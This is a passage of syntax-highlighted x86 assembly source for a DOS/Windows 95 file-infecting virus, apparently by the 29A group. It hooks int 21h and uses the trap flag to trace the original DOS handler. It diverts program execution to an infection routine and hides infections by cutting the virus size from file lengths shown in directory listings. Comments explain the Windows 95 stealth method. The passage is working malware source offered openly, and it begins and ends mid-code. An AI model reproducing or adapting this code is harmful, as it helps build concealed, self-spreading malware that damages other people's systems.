        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc12">'RULZ'</span><span class="sc0">                  </span><span class="sc1">; Original, isn't it ? :-P</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">InVirus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">@Fale_ok</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_old</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_old</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_endstack2</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all_regs</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                  </span><span class="sc1">; As if nothing happened in int21h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jump_handle</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jump_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">saved21</span><span class="sc0">
        </span><span class="sc6">movsd</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">


        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04b00h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">fcb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">fcb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">handle</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">handle</span><span class="sc0">

</span><span class="sc5">We_finish_here_anyway</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0004h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Trace_01</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0006h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">trace_flag</span><span class="sc4">],</span><span class="sc2">5d</span><span class="sc0">

</span><span class="sc5">_HowMuch</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; To set how much to trace</span><span class="sc0">

</span><span class="sc5">finished</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Trap flag</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_old</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_old</span><span class="sc0">


</span><span class="sc5">@Returnboy</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">jumper</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">            </span><span class="sc1">; call xxxx:yyyy</span><span class="sc0">
</span><span class="sc5">jump_handle</span><span class="sc4">:</span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">saved21</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">10d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">trace_off</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Trace_01</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all_regs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">22d</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Alacalleostias</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">trace_flag</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Alacalleostias</span><span class="sc0">          </span><span class="sc1">; Done !</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rehandle</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_Ax</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">4d</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_Ax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">InVirus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">Alacalleostias</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">

        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">stack_old</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Trace_flag</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;                       ALTERNATE INT 21h HANDLER</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">Alternate_21_handler</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0cacah</span><span class="sc0">       </span><span class="sc1">; Tsr check ( temporal )</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@NoTsrCheck</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc12">'_29A'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@NoTsrCheck</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc12">'RULZ'</span><span class="sc0">                  </span><span class="sc1">; :-P</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">tha_difference</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">not_W95</span><span class="sc4">-</span><span class="sc5">We_finish_here_anyway</span><span class="sc0">

</span><span class="sc5">@NoTsrCheck</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all_regs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">return_point</span><span class="sc4">],</span><span class="sc5">tha_difference</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">029ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">029ah</span><span class="sc0">  </span><span class="sc1">; 4b00h xor 029ah</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_inf_W95</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EXE_W95_Infect</span><span class="sc0">

</span><span class="sc5">not_inf_W95</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">714eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">029ah</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">W95_Stealth</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">714fh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">029ah</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">W95_Stealth</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">StealthHandle</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_W95</span><span class="sc0">
</span><span class="sc5">StealthHandle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">return_point</span><span class="sc4">],</span><span class="sc5">tha_difference</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">handle</span><span class="sc0">
</span><span class="sc5">not_W95</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FCB_St</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_FCB</span><span class="sc0">
</span><span class="sc5">FCB_st</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">return_point</span><span class="sc4">],</span><span class="sc5">tha_difference</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fcb</span><span class="sc0">
</span><span class="sc5">not_FCB</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">return_point</span><span class="sc4">],</span><span class="sc5">tha_difference</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">


        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">j21</span><span class="sc0">


</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;                            HANDLE STEALTH</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Nothing exists. Nothing has sense. Not nothing. Not a fuck. Fuck it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Fuck it off.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; Handle stealth, functions</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Int21h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;4eh/4fh. The most original</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">handle_out</span><span class="sc0">              </span><span class="sc1">;routines in some viruses ;)</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_infec</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc5">Virus_size</span><span class="sc4">+</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc2">06bh</span><span class="sc0">
</span><span class="sc5">not_infec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

</span><span class="sc5">handle_out</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">InVirus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21h_plural</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">No_Estamos_en_95</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">No_Estamos_en_95</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all_regs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rehandle</span><span class="sc0">       </span><span class="sc1">; REPONER CO¥O !</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_old</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_old</span><span class="sc0">

</span><span class="sc5">Estamos_en_95</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">


</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;                      Windows 95 Ms-Dos stealth</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;       Win95 stealth:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       W95's Ms-Dos 7.0 performs the "dir" instruction by means of</span><span class="sc0">
</span><span class="sc1">; int21h's 714eh and 714fh functions ( FindFirst/FindNext ). Anyway, by</span><span class="sc0">
</span><span class="sc1">; the method this virus infects, it's just impossible to stealth directly</span><span class="sc0">
</span><span class="sc1">; there because we can't check if the virus is infected.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       When FindFirst/FindNext functions are called, the results are</span><span class="sc0">
</span><span class="sc1">; beeing stored not in a DTA as usual in previous DOS versions, but in a</span><span class="sc0">
</span><span class="sc1">; W32_FIND_DATA structure. You can easily find a description from this,</span><span class="sc0">
</span><span class="sc1">; but really what we only care about is the place where the file length</span><span class="sc0">
</span><span class="sc1">; is stored, that's a DD in the offset 1ch and another in the offset 20h,</span><span class="sc0">
</span><span class="sc1">; beeing the second the Low DD of the file length and the first one the</span><span class="sc0">
</span><span class="sc1">; High DD of file length.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       So, as 714e/f is called, the OS passes in ES:DI where this</span><span class="sc0">
</span><span class="sc1">; structure is. We can substract then the virus length to the offset 20h</span><span class="sc0">
</span><span class="sc1">; ( and sbb in 1ch, which wouldn't be really necesarry ); but how do we</span><span class="sc0">
</span><span class="sc1">; check the date if it's set to 61/62 seconds ?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       We can't. Let's look at the offset of LastAccessTime, which is</span><span class="sc0">
</span><span class="sc1">; 0ch, or at the offset LastWriteTime, which is 14h. They have "FILETIME"</span><span class="sc0">
</span><span class="sc1">; format, that is, two DDs with Low and High filetime. The bad stuff is,</span><span class="sc0">
</span><span class="sc1">; it's stored in nanoseconds*10^2 from January 1, 1601 (!!!) as the</span><span class="sc0">
</span><span class="sc1">; documentation tells us. So, you should have noticed by now that then it's</span><span class="sc0">
</span><span class="sc1">; impossible to check if the seconds were set at a "strange" position, as</span><span class="sc0">
</span><span class="sc1">; it's stored in seconds^(-7) ! ( so where's the Y2K problem that W98 tells</span><span class="sc0">
</span><span class="sc1">; us is aware of ? )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Well, I made the easy "old dos" solution, which goes fast in a slow</span><span class="sc0">
</span><span class="sc1">; W95, and the most important, works perfect; just open the file, get the</span><span class="sc0">
</span><span class="sc1">; file time by 5700h funtion, and decrease in the W32_FIND_DATA the virus</span><span class="sc0">
</span><span class="sc1">; size if it's infected ;-).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">W95_Stealth</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">return_point</span><span class="sc4">],</span><span class="sc5">tha_difference</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all_regs</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
